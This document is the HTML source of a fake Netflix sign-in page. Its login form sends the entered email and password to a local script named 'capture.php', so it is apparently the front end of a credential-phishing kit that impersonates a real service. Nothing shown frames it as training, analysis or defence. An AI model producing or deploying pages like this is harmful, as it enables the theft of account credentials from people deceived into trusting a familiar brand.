<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix Sign In</title>
  <link rel="stylesheet" href="./style.css">
</head>
<body>
  <div class="background">
    <div class="overlay">
      <form action="./capture.php" method="POST">
        <h1>Sign In</h1>
        <div class="input-group">
          <lable for ="email">Email or Username</lable>
          <input type="email" id="email" name="email" required>
          <p class="error-message">Please enter a valid email address or phone number.</p>
        </div>
        <div class="input-group">
        <lable for ="password">Password</lable>
          <input type="password" id="password" name="password" required>
          <p class="error-message">Your password must contain between 4 and 60 characters.</p>
        </div>
        <button type="submit" class="btn">Sign In</button>
        <div class="options">
          <p>OR</p>
          <button type="button" class="btn-secondary">Use a sign-in code</button>
          <a href="#" class="forgot-password">Forgot password?</a>
        </div>
      </form>
    </div>
  </div>
</body>
</html>
